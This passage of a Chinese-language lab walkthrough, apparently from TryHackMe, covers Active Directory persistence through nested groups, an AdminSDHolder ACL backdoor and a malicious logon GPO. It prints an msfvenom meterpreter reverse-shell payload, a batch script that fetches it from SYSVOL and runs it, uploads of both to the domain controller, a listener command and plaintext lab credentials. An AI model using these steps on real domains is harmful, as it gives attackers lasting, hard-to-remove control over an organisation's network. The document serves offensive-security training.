PS C:\Users\Administrator.ZA&gt;Add-ADGroupMember -Identity <span class="hljs-string">"hybcx_nestgroup1"</span> -Members <span class="hljs-string">"louis.cole"</span></code></pre>
<p>完成上述操作之后，我们的低权限AD用户将获得针对THMDC(目标域控)机器的访问特权，我们可以使用该低权限用户通过SSH访问THMWRK1跳板主机并执行相关命令来验证这一点：</p>
<pre><code class="hljs scss">za\chloe<span class="hljs-selector-class">.potter</span><span class="hljs-keyword">@THMWRK</span>1 <span class="hljs-attribute">C</span>:\Users\chloe.potter&gt;dir \\thmdc.za.tryhackme.loc\c$\ 
 Volume in drive \\thmdc.za.tryhackme.loc\c$ is Windows        
 Volume Serial Number is <span class="hljs-number">1634</span>-<span class="hljs-number">22</span>A9

 Directory of \\thmdc.za.tryhackme.loc\c$

<span class="hljs-number">01</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">07</span>:<span class="hljs-number">47</span> AM               <span class="hljs-number">103</span> delete-vagrant-user.ps1 
<span class="hljs-number">05</span>/<span class="hljs-number">01</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">11</span> AM               <span class="hljs-number">169</span> dns_entries.csv
<span class="hljs-number">09</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">07</span>:<span class="hljs-number">19</span> AM    &lt;DIR&gt;          PerfLogs
<span class="hljs-number">05</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">09</span>:<span class="hljs-number">32</span> AM    &lt;DIR&gt;          Program Files
<span class="hljs-number">03</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">08</span>:<span class="hljs-number">28</span> PM    &lt;DIR&gt;          Program Files (x86)     
<span class="hljs-number">07</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">05</span>:<span class="hljs-number">05</span> PM             <span class="hljs-number">7</span>,<span class="hljs-number">168</span> shell.exe
<span class="hljs-number">05</span>/<span class="hljs-number">01</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">17</span> AM             <span class="hljs-number">1</span>,<span class="hljs-number">725</span> thm-network-setup-dc.ps1
<span class="hljs-number">07</span>/<span class="hljs-number">06</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">03</span>:<span class="hljs-number">38</span> PM    &lt;DIR&gt;          tmp
<span class="hljs-number">06</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">01</span>:<span class="hljs-number">58</span> PM    &lt;DIR&gt;          Tools
<span class="hljs-number">02</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">10</span>:<span class="hljs-number">29</span> PM    &lt;DIR&gt;          Users
<span class="hljs-number">04</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">06</span>:<span class="hljs-number">11</span> PM    &lt;SYMLINKD&gt;     vagrant [\\vboxsvr\vagrant] 
<span class="hljs-number">07</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">51</span> AM    &lt;DIR&gt;          Windows
               <span class="hljs-number">4</span> File(s)          <span class="hljs-number">9</span>,<span class="hljs-number">165</span> bytes
               <span class="hljs-number">8</span> Dir(s)  <span class="hljs-number">51</span>,<span class="hljs-number">539</span>,<span class="hljs-number">042</span>,<span class="hljs-number">304</span> bytes free</code></pre>
<p>回到我们之前使用administrator帐户所建立的SSH会话界面，我们还可以验证一下，即使我们创建了多个组，域管理员组也只有一个新成员：</p>
<pre><code class="hljs scss">PS C:\Users\Administrator.ZA&gt; Get-ADGroupMember -Identity <span class="hljs-string">"Domain Admins"</span>


distinguishedName : CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=loc
name              : Administrator
objectClass       : user
objectGUID        : <span class="hljs-number">0</span>bbd7980-b53b-<span class="hljs-number">4634</span>-<span class="hljs-number">8</span>a28-<span class="hljs-number">57</span>e4234655c2
SamAccountName    : Administrator
SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">500</span>

distinguishedName : CN=matthew.williams,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC= 
                    loc
name              : matthew.williams
objectClass       : user
objectGUID        : c4f5743a-c362-<span class="hljs-number">49</span>c5-b95c-<span class="hljs-number">5</span>ec2a33bf480
SamAccountName    : matthew.williams
SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">1114</span>

distinguishedName : CN=Am0 Net Group <span class="hljs-number">5</span>,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc 
name              : Am0 Net Group <span class="hljs-number">5</span>
objectClass       : group
objectGUID        : ba545574-<span class="hljs-number">6</span>af9-<span class="hljs-number">4</span>a3d-a8df-<span class="hljs-number">24</span>ab582fc04c
SamAccountName    : am0_nestgroup5
SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">6163</span>

distinguishedName : CN=timtaylor Net Group <span class="hljs-number">5</span>,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc 
name              : timtaylor Net Group <span class="hljs-number">5</span>
objectClass       : group
objectGUID        : c7df8bd5-d8ed-<span class="hljs-number">44</span>a6-<span class="hljs-number">9</span>ec2-<span class="hljs-number">375935</span>db3c83
SamAccountName    : timtaylor_nestgroup5
SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">6168</span>

distinguishedName : CN=hybcx Net Group <span class="hljs-number">5</span>,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc 
name              : hybcx Net Group <span class="hljs-number">5</span>
objectClass       : group
objectGUID        : bcf18156-<span class="hljs-number">2091</span>-<span class="hljs-number">4</span>b3d-<span class="hljs-number">89</span>cc-fefae53893fd
SamAccountName    : hybcx_nestgroup5
SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">6610</span></code></pre>
<p>虽然这里很多组成员，但这是由于这个靶机是共享的，我们只需要关注之中的<code>hybcx Net Group 5</code>只有这一个</p>
<h2 id="烦人的不仅仅是蓝队">烦人的不仅仅是蓝队</h2>
<p>如果是在现实的企业网络环境中，我们不必创建新的组来进行组嵌套，实际上，我们完全可以利用现有的组来执行组嵌套操作；然而，这是我们在正常的红队评估行动中永远不会做的事情，因为这种组嵌套操作会破坏企业组织的AD域网络结构，如果这种破坏足够充分，那么AD域网络结构将无法恢复。</p>
<p>这意味着：即使蓝队能够将我们所获得的权限取消，企业组织也很可能需要从头开始重建他们的整个AD网络结构，这将会造成企业的重大损失。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240301092532408.png" alt="image-20240301092532408"></p>
<h1 id="0x07-通过acl进行持久化">0x07 通过ACL进行持久化</h1>
<p>有时候，我们可能不仅仅想要通过正常的AD组来实现权限维持，而是希望基于所有受保护的组来进行权限维持。</p>
<h2 id="使用ad组模板">使用AD组模板</h2>
<p>虽然我们可以向我们所能找到的每个特权组添加一个受我们控制的AD帐户，但是蓝队仍然可以执行相关的清理操作并删除我们所添加的组成员。为了确保更好进行权限维持，我们可以尝试注入模板以生成默认组，通过对这些模板执行注入操作，即使蓝队删除了我们所添加的组成员，我们也只需要等待模板刷新，然后我们就能再次让我们所控制的AD帐户获得组成员资格。</p>
<p>一个我们可用的模板是AdminSDHolder容器。该容器存在于每个AD域中，我们能够以其ACL(Access Control List-访问控制列表)为模板，从而将权限复制到所有的受保护组中。常见的受保护组包括Domain Admins、Administrators、Enterprise Admins、Schema Admins等特权组。如果想要查看关于受保护组的完整列表，可以访问以下链接：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)">https://learn.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)</a></p>
</blockquote>
<p>一个名为SDProp的进程能够获取AdminSDHolder容器的ACL，并可以每60分钟将其应用于所有受保护组；因此，我们可以基于此进程编写一个ACE(访问控制条目)，它将授予我们对于所有受保护组的完全权限。如果蓝队没有意识到这种类型的权限维持技术正在被使用，那么他们将很难完全清除攻击者所获得的权限。因为，即使蓝队删除了那些基于受保护对象或者组的不恰当的权限之后，相关的权限仍然会在一个小时内被重新分配。由于这种重新授权是通过正常的AD过程来进行的，因此这种操作也不会让蓝队收到任何警报提示，这会让蓝队更加难以确定这种持久化权限的来源。</p>
<h2 id="使用adminsdholder容器修改其acls实现权限维持">使用AdminSDHolder容器(修改其ACLs)实现权限维持</h2>
<p>为了基于AdminSDHolder容器来进行权限维持操作，我们还将使用Microsoft管理控制台(MMC-Microsoft Management Console)。我们首先会使用上文所提及的低权限的AD帐户来通过RDP访问跳板主机THMWRK1，然后在跳板机的终端中使用runas命令注入管理员凭据到当前会话中并启动另一个终端程序，最后我们将从此新终端启动MMC：</p>
<pre><code class="hljs scss">xfreerdp /d:za.tryhackme.loc /u:<span class="hljs-string">'grace.clarke'</span> /p:<span class="hljs-string">'Password1'</span> /v:thmwrk1.za.tryhackme.loc /cert:ignore +clipboard

C:\Users\chloe.potter&gt; runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe
#Password:tryhackmewouldnotguess1@

#在新终端界面中执行以下命令
C:\Windows\system32&gt; mmc.exe  #这能让我们以管理员用户身份成功访问到域控制器上的MMC控制台</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303085356250.png" alt="image-20240303085356250"></p>
<p>成功打开MMC窗口之后，我们向其添加“Users and Groups用户和组”管理单元(File-&gt;Add/Remove Snap-in-&gt;Active Directory Users and Computers)，并且选中目标域以启用高级功能(View-&gt;Advanced Features)，然后我们就可以在Domain-&gt;System下面找到AdminSDHolder组：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303085559829.png" alt="image-20240303085559829"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303090321147.png" alt="image-20240303090321147"></p>
<p>我们继续导航到该组的Security 属性(右键单击AdminSDHolder-&gt;Properties-&gt;Security)：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303090415276.png" alt="image-20240303090415276"></p>
<p>让我们在上述界面中添加我们所控制的低权限AD用户，并且授予其完全控制(Full Control)权限：</p>
<ol>
<li>点击<strong>Add</strong>(添加)。</li>
<li>搜索我们所能使用的低权限AD用户名称(例如chloe.potter)，然后点击<strong>Check Names</strong>(检查名称)。</li>
<li>点击<strong>OK</strong>。</li>
<li>选择<strong>Full Control</strong>(完全控制)并点击<strong>Allow</strong>(允许)。</li>
<li>点击<strong>Apply</strong>(应用)。</li>
<li>点击<strong>OK</strong>。</li>
</ol>
<p>添加成功之后，具体结果将如下所示：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303090554301.png" alt="image-20240303090554301"></p>
<h2 id="手动启动sdprop进程">手动启动SDProp进程</h2>
<p>正常情况下，我们可能需要等待60分钟，然后我们所添加的低权限用户将能够完全控制所有的受保护组。这是因为安全描述符传播器(SDProp)服务每60分钟会自动执行一次，并且它会将我们所更改的ACL(访问控制列表)传播到所有的受保护组。</p>
<p>tips：SDProp的全称为Security Descriptor Propagator(安全描述符传播器)。</p>
<p>由于等待时间过长，我们将使用Powershell命令来手动启动该进程，我们可以在<code>C:\Tools\</code>目录下找到并使用脚本<code>Invoke-ADSDPropagation</code>来手动启动上述所提及的SDProp进程：</p>
<pre><code class="hljs scss">#使用rdp访问域控制器
xfreerdp /d:za.tryhackme.loc /u:<span class="hljs-string">'administrator'</span> /p:<span class="hljs-string">'tryhackmewouldnotguess1@'</span> /v:THMDC.za.tryhackme.loc /cert:ignore +clipboard

# Enter a PowerShell session
# Now running a PowerShell session on the domain controller...

#PS C:\Tools&gt; Import-Module .\Invoke-ADSDPropagation.ps1 
#PS C:\Tools&gt; Invoke-ADSDPropagation
cd C:\Tools
dir
Import-Module C:\Tools\Invoke-ADSDPropagation.ps1
Invoke-ADSDPropagation


#不通过RDP的方法，即使用上述runas注入命令所启动的cmd.exe

#powershell -ep bypass

# WinRM to the domain controller as the DA

#Enter-PSSession -ComputerName thmdc.za.tryhackme.loc

# Now running a PowerShell session on the domain controller...

#Import-Module C:\Tools\Invoke-ADSDPropagation.ps1
#Invoke-ADSDPropagation</code></pre>
<p>完成上述操作后，大概等待一分钟左右，然后继续使用上文中的MMC控制台检查受保护组(如Domain Admins组)的安全权限：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303091224810.png" alt="image-20240303091224810"></p>
<p>我们可以看到，我们的低权限AD用户对于Domain Admins组具有完全控制权限，我们可以从DA组的安全权限属性中删除低权限AD用户并重新运行PowerShell脚本来验证我们之前所修改的模版组的ACL将继续传播，而且我们的低权限用户将会被再次添加到Domain Admins组的ACL中。有趣的是，虽然我们有权限修改DA组，但是它并不会自动将我们的低权限AD用户(例如grace.clarake)添加到组成员列表中：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303091534622.png" alt="image-20240303091534622"></p>
<p>我们可以使用我们所被分配的新权限，将对应的低权限AD用户(例如grace.clarke)作为组成员添加到DA组中：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303091608104.png" alt="image-20240303091608104"></p>
<p>然后验证低权限用户的可用特权：（这里不知道为何验证不成功）</p>
<p>成功实例：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303094231829.png" alt="image-20240303094231829"></p>
<p>我的示例：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303094248960.png" alt="image-20240303094248960"></p>
<p>tips：在手动启动SDProp进程之后，我们也可以通过之前的RDP界面(用于低权限AD用户访问跳板主机的RDP，见上文)执行PowerShell命令来向受保护组(例如DA组)手动添加组成员。</p>
<pre><code class="hljs scss">Add-ADGroupMember -Identity 'Domain Admins' -Members 'grace<span class="hljs-selector-class">.clarke</span>'

Get-ADGroupMember -Identity 'Domain Admins' | Where-<span class="hljs-selector-tag">Object</span> {$_<span class="hljs-selector-class">.SamAccountName</span> -eq 'grace<span class="hljs-selector-class">.clarke</span>'}

dir \\thmdc<span class="hljs-selector-class">.za</span><span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span>\C$\Users</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303094310594.png" alt="image-20240303094310594"></p>
<p>上述的方法我依旧不成功。。。</p>
<h2 id="蓝队正在走下坡路">蓝队正在走下坡路</h2>
<p>我们可以将本小节的权限维持技术与上一小节中的组嵌套技术结合起来。即使蓝队通过更改大量的组撤销了我们所获得的访问权限，但是在60分钟后，我们仍然可以重新被自动分配权限。除非蓝队知道我们所获得的权限是通过修改AdminSDHolder组而来的，否则蓝队每隔60分钟就会感到头疼。</p>
<p>由于这种权限维持是通过合法的AD服务来传播实现的，因此每次发生上述自动分配权限的情况时，蓝队都难以找到真正的问题所在。我们还可以将完全控制权限授予AdminSDHolder模版组中的Domain Users(域用户)组，这意味着任何低权限AD用户都将被授予对于所有的受保护组的完全控制权限。此外，我们还可以将此项技术与完整的DC同步攻击相结合，这意味着蓝队还需要重置目标AD域中的每个凭据以尝试彻底清除我们所获得的权限。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303093752885.png" alt="image-20240303093752885"></p>
<h1 id="0x08-通过gpo实现持久化">0x08 通过GPO实现持久化</h1>
<p>GPO，即组策略对象，它可以被用于帮助我们执行AD枚举、AD攻击或者AD利用等技术，同时，它也可以被用于实现域权限维持。</p>
<p>AD域中的组策略管理(GPM)能够提供一种集中的机制来管理所有域内机器的本地策略配置，包括对受限制组的成员关系、防火墙程序、反病毒程序等功能的配置，以及配置主机启动时应该执行哪些脚本。虽然GPM是一个很好的管理工具，但是攻击者也可能会针对GPM以便在目标AD域中实现权限维持，更糟糕的是，攻击者还可以隐藏恶意的GPO，以至于蓝队难以将恶意的GPO删除。</p>
<h2 id="介绍">介绍</h2>
<p>以下是一些常见的基于GPO的权限维持技术：</p>
<ul>
<li>配置受限制组的成员关系：这将允许我们以管理并访问域内的所有主机。</li>
<li>部署登录脚本：这将确保每次AD用户对域中的主机进行身份验证时(如AD用户的登录操作)，我们都会得到一个shell回调。</li>
</ul>
<p>我们在本小节中会重点关注上述第二种权限维持技术，虽然能够访问所有域内主机是件好事，但是如果能够确保我们以管理员权限来访问这些主机，那就更好了。为此，我们将创建一个链接到Admins OU(组织单元)的GPO，这将允许我们在AD用户每次对域内主机进行身份验证时能够获得相关的shell。</p>
<h2 id="前期准备工作">前期准备工作</h2>
<p>在我们创建GPO之前，我们首先需要生成shell文件、设置端口侦听器以及编写能够执行shell的bat文件。我们可以使用以下命令来生成一个可执行的shell文件：</p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/x64/meterpreter/reverse_tcp lhost=persistad lport=<span class="hljs-number">5555</span> -f exe &gt; hybcx_shell<span class="hljs-selector-class">.exe</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303095504713.png" alt="image-20240303095504713"></p>
<p>接下来，我们还需要创建一个批处理脚本，此脚本会在AD用户登录主机时在目标系统上运行，该脚本将执行以下操作：</p>
<ol>
<li>将有效载荷文件(即上面所生成的shell文件)从域控制器(DC)上的SYSVOL目录复制到AD用户的计算机上的临时目录下；</li>
<li>等待20秒并完成shell文件的复制；</li>
<li>执行有效载荷文件，生成反向shell。</li>
</ol>
<p>bat脚本(<code>my_script.bat</code>)的内容如下所示：</p>
<pre><code class="hljs scss">#在攻击机上创建一个bat脚本(nano my_script.bat)，内容如下所示：

copy \\za<span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span>\sysvol\za<span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span>\scripts\hybcx_shell<span class="hljs-selector-class">.exe</span> C:\tmp\hybcx_shell.exe &amp;&amp; timeout /t <span class="hljs-number">20</span> &amp;&amp; C:\tmp\hybcx_shell.exe</code></pre>
<p>tips：Windows允许我们通过登录GPO执行Batch(批处理)或PowerShell脚本，但是批处理脚本通常比PowerShell脚本更稳定。</p>
<p>我们可以使用scp命令以及上文所提供的Administrator用户凭据，将上述两个文件上传到目标DC的SYSVOL目录中：</p>
<pre><code class="hljs scss">#在攻击机上操作

root:~$ scp hybcx_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/

root:~$ scp hybcx_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/

#用户名：administrator
#密码：tryhackmewouldnotguess1@</code></pre>
<p>最后，我们还需要在攻击机上设置MSF端口侦听器：</p>
<pre><code class="hljs scss">root:~$ msfconsole -q -x <span class="hljs-string">"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.58.47; set LPORT 5555;exploit"</span>

[*] Using configured payload generic/shell_reverse_tcp
payload =&gt; windows/x64/meterpreter/reverse_tcp
LHOST =&gt; persistad
LPORT =&gt; <span class="hljs-number">4445</span>
[*] Started reverse TCP handler on <span class="hljs-number">10.50</span>.<span class="hljs-number">84.147</span>:<span class="hljs-number">4445</span></code></pre>
<h2 id="创建gpo">创建GPO</h2>
<p>现在，我们的准备工作已经完成，接下来我们需要创建GPO，我们将通过RDP连接到跳板主机THMWRK1，并使用runas命令注入管理员凭据以启动MMC控制台。这部分内容可以参考上一小节的操作步骤：</p>
<pre><code class="hljs scss">#在攻击机上另启一个终端
xfreerdp /d:za.tryhackme.loc /u:<span class="hljs-string">'chloe.potter'</span> /p:<span class="hljs-string">'Marisa2014'</span> /v:thmwrk1.za.tryhackme.loc /cert:ignore +clipboard

runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe
#用户名：administrator
#密码：tryhackmewouldnotguess1@

mmc.exe</code></pre>
<p>在MMC控制台中选择File &gt; Add/Remove Snap-ins，并添加<strong>Group Policy Management</strong>(组策略管理)单元：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303100320547.png" alt="image-20240303100320547"></p>
<p>这里我点击OK之后总是报错，说是不能联系上对应的DC控制器，这里没办法，我就直接照搬看思路了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101446479.png" alt="image-20240303101446479"></p>
<p>在本小节中，我们将编写一个会被应用到所有管理员的GPO，我们先右键点击GPM中的Admins OU，然后选择在当前域中创建GPO以完成链接。我们可以指定一个名称给我们所创建的GPO，如<code>username - persisting GPO</code>：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101530917.png" alt="image-20240303101530917"></p>
<p>tips：从技术上讲，我们也可以将恶意内容写入上图中的默认域策略(Default Domain Policy)，该策略能够被传播给所有的AD对象。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101547299.png" alt="image-20240303101547299"></p>
<p>右键单击我们所创建的GPO并选择Enforced(强制执行)，这将确保我们的策略被应用(即使存在策略冲突，这也能让我们的策略更加优先)：</p>
